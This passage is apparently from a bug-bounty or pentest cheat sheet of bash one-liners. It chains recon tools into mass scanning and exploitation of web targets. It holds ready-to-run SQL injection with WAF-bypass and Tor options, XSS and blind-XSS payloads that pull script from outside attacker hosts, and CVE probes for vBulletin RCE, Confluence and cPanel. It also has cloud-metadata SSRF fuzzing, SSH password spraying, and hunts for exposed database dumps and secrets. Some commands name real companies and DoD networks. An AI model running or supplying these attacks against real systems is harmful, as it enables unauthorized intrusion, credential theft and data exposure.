# Find exposed WordPress wp-config.php_org files containing DB passwords.
```
```bash
xargs -a xss -P10 -I@ sh -c 'goop @'
# Search for exposed .git files using goop tool in parallel.
```
```bash
cat hosts.txt | httpx -c -silent -path "/wp-content/mysql.sql" -mc 200 -t 250 -p 80,443,8080,8443 | anew wp-sql.txt
# Search for exposed WordPress MySQL dumps by probing common path and saving live URLs.
```
```bash
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv | cat domains.txt | sed 's****.git/HEAD**' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
# Download bounty target domains, append .git/HEAD, probe for redirects and content length, saving results.
```
```bash
# sensetive file fuzz using dirsearch
dirsearch -l ips_alive --full-url --recursive --exclude-sizes=0B --random-agent -e 7z,archive,ashx,asp,aspx,back,backup,backup-sql,backup.db,backup.sql,bak,bak.zip,bakup,bin,bkp,bson,bz2,core,csv,data,dataset,db,db-backup,db-dump,db.7z,db.bz2,db.gz,db.tar,db.tar.gz,db.zip,dbs.bz2,dll,dmp,dump,dump.7z,dump.db,dump.z,dump.zip,exported,gdb,gdb.dump,gz,gzip,ib,ibd,iso,jar,java,json,jsp,jspf,jspx,ldf,log,lz,lz4,lzh,mongo,neo4j,old,pg.dump,phtm,phtml,psql,rar,rb,rdb,rdb.bz2,rdb.gz,rdb.tar,rdb.tar.gz,rdb.zip,redis,save,sde,sdf,snap,sql,sql.7z,sql.bak,sql.bz2,sql.db,sql.dump,sql.gz,sql.lz,sql.rar,sql.tar.gz,sql.tar.z,sql.xz,sql.z,sql.zip,sqlite,sqlite.bz2,sqlite.gz,sqlite.tar,sqlite.tar.gz,sqlite.zip,sqlite3,sqlitedb,swp,tar,tar.bz2,tar.gz,tar.z,temp,tml,vbk,vhd,war,xhtml,xml,xz,z,zip,conf,config,bak,backup,swp,old,db,sql,asp,aspx~,asp~,py,py~,rb~,php,php~,bkp,cache,cgi,inc,js,json,jsp~,lock,wadl -o output.txt
``` 
```bash
# earch for Sensitive files from Wayback
echo target.com | (gau || hakrawler || waybackurls || katana) | grep -color -E ".xls | \\. xml | \\.xlsx | \\.json | \\. pdf | \\.sql | \\. doc| \\.docx | \\. pptx| \\.txt| \\.zip| \\.tar.gz| \\.tgz| \\.bak| \\.7z| \\.rar"
```
```bash
# Company Sensitive Data using gau
cat subdomains.txt | gau | tee gau.txt | grep -E
"\\.xls|\\.xlsx|\\.json|\\.pdf|\\.sql|\\.doc|\\.docx|\\.pptx|\\.mp3|\\.mp4|\\.zip|\\.tar|\\.gzip|\\.rar|\\.json"
| tee sensitive-files.txt
```
```bash
# Search subdomains in cert.sh assetfinder to search in link /.git/HEAD
curl -s "https://crt.sh/?q=%25.tesla.com&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | sed 's****.git/HEAD**' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
```
```bash
# Easiest Information Disclosure in JSON body
cat subdomains.txt | waybackurls | httpx -mc 200 -ct | grep application/json
```
```bash
# Extract Sensitive Informations on /auth.json Endpoint
subfinder -d TARGET.COM | httpx -path "/auth.json" -title -status-code -content-length -t 80 -p 80,443,8080,8443,9000,9001,9002,9003
```
```bash
# OneLiner for CVE-2023-23752 - 𝙅𝙤𝙤𝙢𝙡𝙖 𝙄𝙢𝙥𝙧𝙤𝙥𝙚𝙧 𝘼𝙘𝙘𝙚𝙨𝙨 𝙘𝙝𝙚𝙘𝙠 𝙞𝙣 𝙒𝙚𝙗𝙨𝙚𝙧𝙫𝙞𝙘𝙚 𝙀𝙣𝙙𝙥𝙤𝙞𝙣𝙩
subfinder -d http://TARGET.COM -silent -all | httpx -silent -path 'api/index.php/v1/config/application?public=true' -mc 200
```
> **Apk**
```bash
# info discloser
apktool d apk;grep -EHim "accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|http:|https:|password|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager|insert into" APKfolder
``` 
> **SQLi Injection**
```bash
# Find SQL injection at scale
subfinder -d site.com -all -silent | waybackurls | sort -u | gf sqli > gf_sqli.txt; sqlmap -m gf_sqli.txt --batch --risk 3 --random-agent | tee -a sqli.txt
```
```bash
subfinder -d http://TARGET.com -silent -all | gau - blacklist ttf,woff,svg,png | sort -u | gf sqli >gf_sqli.txt; sqlmap -m gf_sqli.txt --batch --risk 3 --random-agent | tee -a sqli_report.txt
```
```bash
# Search SQLINJECTION using qsreplace search syntax error
grep "="  .txt| qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n"
```
```bash
# SQL Injection
findomain -t http://testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 1
```
```bash
# SQLi using dnsx, httpx, xargs, findomain, waybackurls, gf, sqlmap
httpx -l targets.txt -silent -threads 1000 | xargs -I@ sh -c 'findomain -t @ -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1'`
```
```bash
# SQLi-TimeBased scanner
gau DOMAIN.tld  | sed 's/=[^=&]*/=YOUR_PAYLOAD/g' | grep ?*= | sort -u | while read host;do (time -p curl -Is $host) 2>&1 | awk '/real/ { r=$2;if (r >= TIME_OF_SLEEP ) print h " => SQLi Time-Based vulnerability"}' h=$host ;done
```
```bash
echo http://testphp.vulnweb.com | waybackurls > wayback_urls_for_target.txt ; python3 sqlidetector.py -f  wayback_urls_for_target.txt
```
```bash
waybackurls target.com | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' | sort -u | sed 's/\(=[^&]*\)/=/g' | tee urls.txt | sort -u -o urls.txt && cat urls.txt | xargs -I{} sqlmap --technique=T --batch -u "{}"
```
```bash
# SQLmap Tamper Scripts - WAF bypass
sqlmap -u 'http://www.site.com/search.cmd?form_state=1' --level=5 --risk=3 --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --no-cast --no-escape --dbs --random-agent
```
```bash
# Bypass WAF using TOR
sqlmap -r request.txt --time-sec=10 --tor --tor-type=SOCKS5 --check-tor --dbs --random-agent --tamper=space2comment
```
```bash
cat subs.txt | (gau || hakrawler || katana || waybckurls) | grep "=" | dedupe | anew tmp-sqli.txt && sqlmap -m tmp-sqli.txt --batch --random-agent --level 5 --risk 3 --dbs &&
for i in $(cat tmp-sqli.txt); do ghauri -u "$i" --level 3 --dbs --current-db --batch --confirm; done
```
```bash
cat urls.txt | grep ".php" | sed 's/\.php.*/.php\//' | sort -u | sed s/$/%27%22%60/ | while read url do ; do curl --silent "$url" | grep -qs "You have an error in your SQL syntax" && echo -e "$url \e[1;32mSQLI by Cybertix\e[0m" || echo -e "$url \e[1;31mNot Vulnerable to SQLI Injection\e[0m" ;done
```
```bash
cat urls.txt | sed 's/=/=(CASE%20WHEN%20(888=888)%20THEN%20SLEEP(5)%20ELSE%20888%20END)/g' | xargs -I{} bash -c 'echo -e "\ntarget : {}\n" && time curl "'{}'"'
```
```bash
cat urls.txt | grep "=" | qsreplace "1 AND (SELECT 5230 FROM (SELECT(SLEEP(10)))SUmc)" > blindsqli.txt
```
```bash
# Header-Based Blind SQL injection
cat domain.txt | httpx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13'
```
```bash
# find which host is vuln in output folder of sqlmap/ghauri "root@bb:~/.local/share/sqlmap/output"
find -type f -name "log" -exec sh -c 'grep -q "Parameter" "{}" && echo "{}: SQLi"' \;
```
> **Subdomain takeover**
```bash
# Find Subdomains TakeOver
subfinder -d {target} >> domains ; assetfinder -subs-only {target} >> domains ; amass enum -norecursive -noalts -d {target} >> domains ; subjack -w domains -t 100 -timeout 30 -ssl -c ~/go/src/github.com/haccer/subjack/fingerprints.json -v 3 >> takeover ; 
```
```bash
# Subdomain Takeover
cat domains.txt | assetfinder --subs-only | tee subdomains.txt; subjack -w
subdomains.txt -ssl -t 100 | tee -a takeover.txt | grep -v "Vulnerable"
```
> **Remote-code & command execution RCE**
 
```bash
shodan search http.favicon.hash:-601665621 --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host; do curl -s http://$host/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();' | grep -q phpinfo && printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n"; done
# Search Shodan for hosts with specific favicon hash and test for vBulletin RCE by injecting phpinfo().
``` 
```bash
# CVE-2022-22963 SpringShell (400 Code --> Vulnerability)
for host in hosts.txt; do curl $host:port/path?class.module.classLoader.URLs%5B0%5D=0; done`
```
```bash
# CVE-2022-22963 SpringShell`00 Status code indicates vulnerability`
for host in hosts.txt; do curl $host:port/path?class.module.classLoader.URLs%5B0%5D=0; done
```
> **403 Bypass**
```bash
cat hosts.txt | httpx -path /login -p 80,443,8080,8443 -mc 401,403 -silent -t 300 | unfurl format %s://%d | httpx -path //login -mc 200 -t 300 -nc -silent
# Find 401/403 login pages and retry with modified path to bypass and get 200 OK.
```
> **Privilege Escalation**
```bash
# CVE-2023-22515 One Liner Confluence Data Center & Server: Privilege Escalation
cat file.txt | while read host do; do curl -skL "http://$host/setup/setupadministrator.action" | grep -i "<title>Setup System Administrator" && echo $host "Vulnerable"; done
```
> **Cross Site Scripting (XSS)**
```bash
# xsstrike scan to bugbounty targets.
xargs -a xss-urls.txt -I@ bash -c 'python3 /dir-to-xsstrike/xsstrike.py -u @ --fuzzer'
```
```bash
# Dalfox scan to bugbounty targets.
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; cat domains.txt | anew | httpx -silent -threads 500 | xargs -I@ dalfox url @
```
```bash
# Using Wingman to search XSS reflect / DOM XSS
xargs -a domain -I@ sh -c 'wingman -u @ --crawl | notify'
```
```bash
# find reflected parameters for xss - [xss0r]
python3 reflection.py urls.txt | grep "Reflection found" | awk -F'[?&]' '!seen[$2]++' | tee reflected.txt
```
```bash
# kxss x dalfox
hakrawler -url "${1}" -plain -usewayback -wayback | grep "${1}" | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace -a | kxss | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | dalfox pipe -b https://your.xss.ht
# save to .sh, and run bash program.sh target.com
```
```bash
# Knoxss mass hunting
file=$1; key="API_KEY"; while read line; do curl https://api.knoxss.pro -d target=$line -H "X-API-KEY: $key" -s | grep PoC; done < $file
```
```bash
# XSS using airixss, waybackurls, gf, uro, httpx, qsreplace
echo http://testphp.vulnweb.com | waybackurls | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"
```
```bash
# Finding Cross-Site Scripting (XSS) using KnoXSS API
echo "domain" | subfinder -silent | gauplus | grep "=" | uro | gf xss | awk '{ print "curl https://knoxss[.]me/api/v3 -d \"target="$1 "\" -H \"X-API-KEY: APIKNOXSS\""}' | sh
```
```bash
# XSS from waybackurls and qsreplace
echo https://target.com | waybackurls | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq
```
```bash
# Kxss to search param XSS
echo http://testphp.vulnweb.com/ | waybackurls | kxss
```
```bash
# katana x dalfox
echo http://testphp.vulnweb.com | katana -jc -f qurl -d 5 -c 50 -kf robotstxt,sitemapxml -silent | dalfox pipe --skip-bav
```
```bash
# Gxss with single target
echo "testphp.vulnweb.com" | waybackurls | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe
```
```bash
# freq
echo http://testphp.vulnweb.com | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq
```
```bash
# knoxss
echo "domain" | subfinder -silent | gauplus | grep "=" | uro | gf xss | awk '{ print "curl https://knoxss[.]me/api/v3 -d \"target="$1 "\" -H \"X-API-KEY: APIKNOXSS\""}' | sh 
```
```bash
# curl
echo target.com | (gau || hakrawler || waybackurls || katana) | grep '=' | qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
```
```bash
# mass image xss test
cat domains.txt | (gau || hakrawler || waybackurls || katana) | grep -Ev "\.(jpeg|jpg|png|ico|gif|css|woff|svg)$" | uro | grep =  | qsreplace "<img src=x onerror=alert(1)>" | httpx -silent -nc -mc 200 -mr "<img src=x onerror=alert(1)>"
```
```bash
# dalfox & gxss
cat targets.txt | (gau || hakrawler || waybackurls || katana) | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe
```
```bash
# dalfox
cat urls.txt | grep "=" | sed 's/=.*/=/' | sed 's/URL: //' | tee testxss.txt ; dalfox file testxss.txt -b yours.xss.ht
```
```bash
# xsstrike
cat subs.txt | awk '{print $3}'| httpx -silent | xargs -I@ sh -c 'python3 http://xsstrike.py -u @ --crawl'
```
```bash
# anew x gf x nilo x gxss x dalfox
cat targets | waybackurls | anew | grep "=" | gf xss | nilo | Gxss -p test | dalfox pipe --skip-bav --only-poc r --silence --skip-mining-dom --ignore-return 302,404,403
```
```bash
# fuff
cat hosts.txt | ffuf -w - -u "FUZZ/sign-in?next=javascript:alert(1);" -mr "javascript:alert(1)" 
```
```bash
# dalfox
cat domainlist.txt | subfinder | dnsx | waybackurl | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | uro | dalfox pipe -b your.xss.ht -o xss.txt
```
```bash
# dalfox
cat test.txt | gf xss | sed ‘s/=.*/=/’ | sed ‘s/URL: //’ | dalfox pipe -b yours-xss-hunter-domain(e.g yours.xss.ht)
```
```bash
# getSJ x httpx ( helpful in XSS & Cross-Origin Communication (PostMessage) vulnerabilities)
cat HOSTS.txt | getJS | httpx --match-regex "addEventListener\((?:'|\")message(?:'|\")"
```
```bash
# dalfox
cat http://target.com | gau --subs | grep "https://" | grep -v "png\|jpg\|css\|js\|gif\|txt" | grep "=" | uro | dalfox pipe --deep-domxss --multicast --blind https://chirag.bxss.in
```
```bash
# Blind XSS Mass Hunting
cat domain.txt | waybackurls | httpx -H "User-Agent: \"><script src=https://chirag.bxss.in></script>"
```
```bash
# CVE-2021-31589 ( XSS with heap based bufferoverflow )
cat subs.txt | while read host do; do curl -sk "$host/appliance/login.ns?login%5Bpassword%5D=test%22%3E%3Csvg/onload=alert(document.domain)%3E&login%5Buse_curr%5D=1&login%5Bsubmit%5D=Change%20Password" | grep -qs '"><svg/onload=alert(document.domain)>' && echo "$host: Vuln" || echo "$host: Not Vuln"; done
```
```bash
# CVE-2022-0378 ( XSS in Packagist microweber/microweber prior to 1.2.11 )
cat URLS.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done
```
```bash
# XSS without gf
waybackurls testphp.vulnweb.com| grep '=' | qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
```
```bash
# waybackurls x dalfox
waybackurls http://testphp.vulnweb.com | gf xss | sed 's/=.*/=/' | sort -u | tee XSS.txt && cat XSS.txt | dalfox -b http://chirag.bxss.in pipe > output.txt
```
```bash
gospider -S target.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | grep '=' | qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
```
```bash
# gospider x qsreplase x dalfox - single target
gospider -s "https://www.target.com/" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o result.txt
```
```bash
# Injection xss using qsreplace to urls filter to gospider
gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>' | httpx -ms "confirm(1)"
```
```bash
# XSS from javascript hidden params
assetfinder *.com | gau | egrep -v '(.css|.svg)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"
```
```bash
# gospider x httpx x qsreplace
httpx -l master.txt -silent -no-color -threads 300 -location 301,302 | awk '{print $2}' | grep -Eo "(http|https)://[^/"].* | tr -d '[]' | anew  | xargs -I@ sh -c 'gospider -d 0 -s @' | tr ' ' '\n' | grep -Eo '(http|https)://[^/"].*' | grep "=" | qsreplace "<svg onload=alert(1)>"
```
```bash
# CVE-2023-29489 ( cPanel XSS One-Liner )
subfinder -d http://example.com -silent -all | httpx -silent -ports http:80,https:443,2082,2083 -path '/cpanelwebcall/<img%20src=x%20onerror="prompt(document.domain)">aaaaaaaaaaaaaaa' -mc 400
```
```bash
# BXSS - Bling XSS in Parameters
subfinder -d target.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://hacker.xss.ht></script>' -parameters
```
```bash
# Blind XSS In X-Forwarded-For Header
subfinder -d target.com | gau | bxss -payload '"><script src=https://hacker.xss.ht></script>' -header "X-Forwarded-For"
```
> **Autometed Scan**

```bash
cat domain | httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s ~/Tools/jaeles-signatures -u @
# Without chaos API key, probe domains from file and scan live hosts with Jaeles signatures.
```
```bash
xargs -a domain -I@ -P500 sh -c 'shuffledns -d "@" -silent -w words.txt -r resolvers.txt' | httpx -silent -threads 1000 | nuclei -t /root/nuclei-templates/ -o re1
# Use shuffledns with wordlist and resolvers, probe live hosts with httpx, and scan with nuclei concurrently.
```
```bash
for i in $(cat subs.txt); do ./xray_linux_amd64 ws --basic-crawler $i --plugins xss,sqldet,xxe,ssrf,cmd-injection,path-traversal --ho $(date +"%T").html ; done
# Scan each subdomain with Xray using multiple vulnerability plugins and save timestamped HTML reports.
```
```bash
chaos -d domain | httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s /jaeles-signatures/ -u @
# Use chaos to enumerate subdomains, probe live hosts, and scan them with Jaeles using specified signatures.
```
```bash 
uncover -q http.title:"GitLab" -silent | httpx -silent | nuclei
# Search for GitLab instances using uncover, probe live hosts, and scan with nuclei. 
```
```bash
# Department of Defense's (DoD) Network Information Center (NIC) domain enum and scaning
uncover -q 'org:"DoD Network Information Center"' | httpx -silent | nuclei -silent -severity low,medium,high,critical
``` 
```bash
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; cat domains.txt | anew | httpx -silent -threads 500 | xargs -I@ jaeles scan -s /jaeles-signatures/ -u @
# Download bounty targets, probe live hosts, and run Jaeles scans.
```
```bash
# Scan for vuln using jaeles
curl -s "https://jldc.me/anubis/subdomains/sony.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | httpx -silent -threads 300 | anew | rush -j 10 'jaeles scan -s /jaeles-signatures/ -u {}'
```
```bash
# Nuclei scan to bugbounty targets.
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; cat domains.txt | httpx -silent | xargs -n 1 gospider -o output -s ; cat output/* | egrep -o 'https?://[^ ]+' | nuclei -t ~/nuclei-templates/ -o result.txt
```
```bash
# Subdomain enum and nuclei scan
amass enum -passive -norecursive -d https://target.com -o domain ; httpx -l domain -silent -threads 10 | nuclei -t nuclei-templates -o result -timeout 30
```
```bash
shodan domain DOMAIN TO BOUNTY | awk '{print $3}' | httpx -silent | nuclei -t /nuclei-templates/
# Search Shodan for domains, probe live hosts, and scan with nuclei templates.
```
```bash
shodan domain domain| awk '{print $3}'|  httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s /jaeles-signatures/ -u @
# Use Shodan to find domains, probe live hosts, and scan with Jaeles signatures.
```
> **Dependency Confusion**
```bash
[ -f "urls.txt" ] && mkdir -p downloaded_json && while read -r url; do wget -q "$url" -O "downloaded_json/$(basename "$url")" && scan_output=$(confused -l npm "downloaded_json/$(basename "$url")") && echo "$scan_output" | grep -q "Issues found" && echo "Vulnerability found in: $(basename "$url")" || echo "No vulnerability found in: $(basename "$url")"; done < <(cat urls.txt)
# Download JSON files from URLs and scan them for dependency confusion vulnerabilities using confused tool.
```
---

<details>
<summary>my commmands</summary>

**On-the-Fly GraphQL Schema Enumeration**
```bash
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}' \
  $GRAPHQL_ENDPOINT \
| jq -r '.data.__schema.types[].name' \
| tee graphql-types.txt
```
**AWS Instance-Metadata SSRF Fuzzing**
```bash
printf '%s\n' user-data iam/security-credentials/role-name instance-id \
| sed 's|^|http://169.254.169.254/latest/meta-data/|' \
| httpx -silent -mc 200,403 \
  -o aws-imds.txt
```
### Out-of-Band (OOB) Vulnerability Scanning
**Automated OOB Template Injection with Nuclei & Interactsh**
```bash
export INTERACT_URL=$(interactsh-client -n 1 -json | jq -r '.Data[0].URL')
nuclei -u https://target.com \
  -t ssrf/oob-injection.yaml \
  -oob-url $INTERACT_URL \
  -silent
```
**Vulnerability-Specific Filters**
```bash
echo 'https://target.com/api?input={"__proto__":{"polluted":true}}' \
| dalfox url --blind --filter \
  -o proto-pollution.txt
```
**Rapid SSH Password Spraying with Hydra**
```bash
hydra -L users.txt -p 'P@ssw0rd2025' -e ns \
  -t 4 ssh://$TARGET \
  -o hydra-spray.txt
```
**Authenticated API User Enumeration with FFUF**
```bash
echo https://target.com/api?user=FUZZ \
| ffuf -u FUZZ \
  -w users.txt \
  -H "Authorization: Bearer $TOKEN" \
  -mr '"id":\d+' \
  -of json \
  -o api-users.json
```
```bash
while read url; do response=$(curl -I -s -L -w "%{http_code}" "$url" -o /dev/null); if [[ "$response" == "200" ]]; then echo "$url"; fi; done < file.txt | while read url; do python SecretFinder.py -i "$url" -o cli; done
```
**line number of a domai**
```bash
grep -n "goole.com" scope.txt
```
**read line number 309**
```bash
head -n 309 scope.txt | tail -n 1
```
**cname**
```bash
cat sub.txt | xargs -I {} host -t cname {} | grep alias
```
```bash
cat scope.txt | httpx -silent -sc -t 1000 > scope2.txt
```
```bash
cat urls.txt | grep -Ei '(\/(admin|control|manage|backend|logs|backup|config|wp-admin|phpmyadmin|db_dump\.sql|backup\.zip|archive\.tar\.gz|git|svn|hg|config\.json|env|web\.config|application\.properties|api\/v[0-9]+\/|graphql|debug|test|staging|dev|console|actuator\/env|oauth2\/authorize|login|password-reset|session|jwt\/generate|keys\.txt|credentials\.csv|s3cfg|id_rsa|solr\/admin|jenkins\/script|swagger-ui\.html|legacy-api)(\/|$|\.(bak|old|tar|zip|~))|\?[^&=]*(token|api_key|secret|redirect)=)|\/([^/]*(\.bak|\.old|\.tar|\.zip|~))|(\b(\.env|web\.config|application\.properties)\b))'
```
```bash
cat domain2.txt | httpx -sc -silent -rl 200 -t 200 -s -td -ct -location -favicon -jarm -title -server -method -websocket -ip -cname -asn -cdn -pa -fr | tee httout.log
```
```bash
waybackurls TARGET-DOMAIN | grep -E "/https?://|\=https?://|\=\/.*" | while read url; do random=$(openssl rand -base64 6 | tr -d '/+');murl=$(echo $url | sed -E "s/(\/|=)(https?:\/\/[^\/&\?]+)/\1http:\/\/TESTER-DOMAIN\/$random/g;s/=\/[^&]+/=http:\/\/TESTER-DOMAIN\/$random/g") && echo "Requesting: $murl" && curl -so /dev/null --connect-timeout 5 "$murl"; done
```
```bash
httpx -x GET,POST,PUT,DELETE,HEAD,OPTIONS,PATCH,TRACE,CONNECT,PROPFIND,PROPPATCH,MKCOL,COPY,MOVE,LOCK,UNLOCK,REPORT,LINK,UNLINK,SEARCH,PURGE,VIEW,CHECKOUT,CHECKIN,TRACK,DEBUG,ORDERPATCH,VERSION-CONTROL,MERGE,BASELINE-CONTROL,SUBSCRIBE,NOTIFY,BIND,UNBIND,ACL,CHECK,UNCHECK,TEXTSEARCH,PRI,LABEL,M-SEARCH,UPDATERESOURCE,POLL,QUERY,INDEX,MKCALENDAR,MKREDIRECTREF,GOAWAY,FB_GRAPHQL,SPACEJUMP,ZIP,REINDEX,EXEC,MS-SQL,GITALK,AWS_S3,BPROPFIND,BPROPPATCH,UNSUBSCRIBE,MKCERTIFICATE,JSONPATCH,SHUTDOWN,VERIFY,MKWORKSPACE,MKACTIVITY,REBIND,NULL,CRASH,GHOST,RPC,HTTP/3,GRPC,SETTINGS,HEADERS,WEBSOCKET,Upgrade,DAV,PATCHV6,SEARCHALL,SYNC,REMOVE,GETPLUS,UPDATE,READ,LOCA -fr -sc -silent -method -mc 200
```
```bash
# hexencode with \x prifix
echo -n "cvp08ukubu2e1a6fh54gw3oqntgo43iy7.oast.site" | xxd -p -c 1 | sed 's/\(..\)/\\x\1/g' | tr -d '\n'
```

</details>

<details>
<summary>Scope</summary>

**Dump In-scope Assets from `bounty-targets-data`**

```bash
# Download all domains to bounty chaos
curl https://chaos-data.projectdiscovery.io/index.json | jq -M '.[] | .URL | @sh' | xargs -I@ sh -c 'wget @ -q'; mkdir bounty ; unzip '*.zip' -d bounty/ ; rm -rf *zip ; cat bounty/*.txt >> allbounty ; sort -u allbounty >> domainsBOUNTY ; rm -rf allbounty bounty/ ; echo '@OFJAAAH'
```
```bash
# Dump In-Scope Assests from Bounty Program
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/bugcrowd_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
```
```bash
curl -sL https://github.com/projectdiscovery/public-bugbounty-programs/raw/master/chaos-bugbounty-list.json | jq -r '.programs[].domains | to_entries | .[].value'
```
```bash
# HackerOne Programs
curl -sL https://github.com/arkadiyt/bounty-targets-data/blob/master/data/hackerone_data.json?raw=true | jq -r '.[].targets.in_scope[] | [.asset_identifier, .asset_type] | @tsv'
```
```bash
# BugCrowd Programs
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/bugcrowd_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
```
```bash
# Intigriti Programs
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/intigriti_data.json | jq -r '.[].targets.in_scope[] | [.endpoint, .type] | @tsv'
```
```bash
# YesWeHack Programs
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/yeswehack_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
```
```bash
# HackenProof Programs
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/hackenproof_data.json | jq -r '.[].targets.in_scope[] | [.target, .type, .instruction] | @tsv'
```
```bash
# Federacy Programs
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/federacy_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
```
</details>


<details>
<summary>Js</summary>

```bash
cat dominios | gau | grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> gauJS.txt ; cat dominios | waybackurls | grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> waybJS.txt ; gospider -a -S dominios -d 2 | grep -Eo "(http|https)://[^/\"].*\.js+" | sed "s**] \- **n**" >> gospiderJS.txt ; cat gauJS.txt waybJS.txt gospiderJS.txt | sort -u >> saidaJS ; rm -rf *.txt ; cat saidaJS | anti-burl |awk '{print $4}' | sort -u >> AliveJs.txt ; xargs -a AliveJs.txt -n 2 -I@ bash -c "echo -e '\n[URL]: @\n'; python3 linkfinder.py -i @ -o cli" ; cat AliveJs.txt  | python3 collector.py output ; rush -i output/urls.txt 'python3 SecretFinder.py -i {} -o cli | sort -u >> output/resultJSPASS'
# Aggregate JS URLs from multiple sources, filter, run linkfinder and SecretFinder on alive JS files to find secrets.
```
```bash
gospider -s https://twitch.tv --js | grep -E "\.js(?:onp?)?$" | awk '{print $4}' | tr -d "[]" | anew | anti-burl
# Crawl twitch.tv for JS files, filter, deduplicate, and clean URLs with anti-burl.
```
```bash
curl -s $1 | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | sort | uniq | grep ".js" > FILE.txt; while IFS= read link; do python linkfinder.py -i "$link" -o cli; done < FILE.txt | grep $2 | grep -v $3 | sort -n | uniq; rm -rf FILE.txt
# Extract JavaScript URLs from a page and run linkfinder to detect secrets, filtering by keywords.
```
```bash
# Download js files
mkdir -p js_files; while IFS= read -r url || [ -n "$url" ]; do filename=$(basename "$url"); echo "Downloading $filename JS..."; curl -sSL "$url" -o "downloaded_js_files/$filename"; done < "$1"; echo "Download complete."
# Or
sed -i 's/\r//' js.txt && for i in $(cat js.txt); do wget "$i"; done
```
```bash
# (Feroxbuster) Read urls from STDIN; pipe only resulting urls out to another tool
cat targets | ./feroxbuster --stdin --silent -s 200 301 302 --redirects -x js | fff -s 200 -o js-files
```
```bash
